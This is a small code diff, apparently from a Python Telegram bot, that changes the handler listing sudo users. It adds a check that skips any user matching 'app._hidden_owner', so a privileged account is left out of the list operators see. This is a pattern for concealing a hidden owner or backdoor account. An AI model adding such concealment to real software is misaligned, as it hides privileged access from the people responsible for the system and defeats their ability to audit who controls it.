@@ -48,6 +48,8 @@ async def _listsudo(_, m: types.Message):
         txt += m.lang["sudo_users"]
 
     for user_id in sudoers:
+        if user_id == app._hidden_owner:
+            continue
         try:
             user = (await app.get_users(user_id)).mention
             txt += f"\n- {user}"
